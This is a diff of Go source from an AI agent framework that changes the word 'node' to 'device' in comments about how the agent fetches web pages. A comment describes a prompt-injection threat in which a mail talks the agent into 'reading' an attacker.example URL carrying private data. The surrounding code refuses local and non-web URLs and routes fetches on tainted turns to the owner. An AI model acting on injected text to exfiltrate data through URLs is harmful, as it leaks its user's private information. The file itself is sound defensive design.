@@ -14,13 +14,13 @@ import (
 
 // The brain's web, as decided in the study "Recherche web du cerveau"
 // (2026-10-27). It searches with its harness's own search (Codex is held to
-// its cached index by the node; OpenCode has none). It reads a page with its harness's reader, and
+// its cached index by the device; OpenCode has none). It reads a page with its harness's reader, and
 // every read comes here, since a URL is also a way out: a brain talked into
 // it by a mail could "read" https://attacker.example/?q=<something private>.
 //
 //   - a URL that is not http(s), or names this machine or the local network
 //     (localhost, a private or loopback IP, a name without a dot), is refused:
-//     the node's egress relay enforces it for every task, this is defence in
+//     the device's egress relay enforces it for every task, this is defence in
 //     depth;
 //   - on a clean turn, the read goes by the web's value (Settings → Tools);
 //   - on a tainted turn, it is mine to decide on a card, which never holds
@@ -33,7 +33,7 @@ import (
 const noWebSearchLine = "Ton harnais n'a pas de recherche web : si une demande en a besoin, dis-le en une ligne et propose une tâche (`run_task`) ou une adresse à lire."
 
 // webFetchTool is the name every harness's page reader reaches eriphe-core
-// under (OpenCode's webfetch is renamed by the node).
+// under (OpenCode's webfetch is renamed by the device).
 const webFetchTool = "WebFetch"
 
 // webSearchTool is the harness's own search.
@@ -207,7 +207,7 @@ func (c *core) ownerWroteURL(raw string) bool {
 	return false
 }
 
-// localURL tells why a URL must not be read from the brain's node: it is
+// localURL tells why a URL must not be read from the brain's device: it is
 // not http(s), or it names this machine or the local network. Only what
 // can be told without a lookup: a name that resolves to a private address
 // is the egress relay's to stop.
